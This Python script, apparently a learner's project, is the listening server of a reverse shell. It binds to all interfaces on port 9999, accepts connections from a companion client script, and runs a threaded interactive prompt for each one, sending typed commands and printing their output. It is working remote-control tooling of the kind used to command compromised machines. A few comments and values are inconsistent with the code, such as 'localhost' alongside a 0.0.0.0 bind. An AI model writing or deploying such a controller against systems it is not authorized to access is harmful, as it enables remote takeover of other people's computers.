# creating a server that listens for incoming connections from the client.py script and sends commands
import socket
import threading

# Listening on localhost (Mac)
HOST = "0.0.0.0"  # Self-testing, use local loopback IP
PORT = 9999

#store connected clients
clients = [2]


# the def handle function handles a specific client connection in its own shell
# conn - socket oject to send and recieve data 
# addr - address of the client
def handle_client(conn, addr):
    print(f"[+] Connection established with {addr[0]} on port {addr[1]}") # display that a client connected
    
    
    while True:
        try:
            cmd = input(f'Shell ({addr[0]}:{addr[1]})> ') #Command input to be sent to the client

            # Checks if the command is 'quit' to close the connection
            if cmd.lower() == "quit":
                conn.send(cmd.encode("utf-8"))
                conn.close()
                print(f"[-] Disconnected from {addr[0]}:{addr[1]}")
                break
            
            # Send the command to the client and receive the output
            if cmd:
                conn.send(cmd.encode("utf-8"))
                response = conn.recv(4096).decode("utf-8")
                print(response)
        
        # Close the connection if the client crashes or closes the connection
        except ConnectionResetError:
            print(f"[-] Connection lost with {addr[0]}:{addr[1]}")
            break

        # Catches any unexpected errors in the command loop and prevents the program from crashing
        except Exception as e:
            print(f"[-] Error occurred: {e}")
            break

# Accepts incoming connections and creates a new thread for each client
def accept_connections(server):

    while True:
        conn, addr = server.accept() # waits for a client to connect
        clients.append((conn, addr)) # add the client in a list to keep track of connected clients
        print(f"[+] New client from {addr[0]}:{addr[1]}") # display that a client connected

        #launch one-on-one shell for this client in its own thread
        thread = threading.Thread(target=handle_client, args=(conn, addr)) # create a new thread to handle this specfic client using the handle function
        thread.start()



# the main server function that is the power switch to start the entire server system 
def start_server():
    # Create the server socket
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create a TCP socket that can speck IP and handle reliable conections
    server.bind((HOST, PORT)) #binds the socket to a specfic IP and port to listne on all interfaces
    server.listen(5) # number of pending onnections can wait

    print(f"[*] Listening for connections on {HOST}:{PORT}...")

    #start a seprate thread to keep accepting clients in the background
    accept_thread = threading.Thread(target=accept_connections, args=(server,)) # creates a new thread to run the accept_connection function to answer incoming connections
    accept_thread.start()

#start the server
start_server()

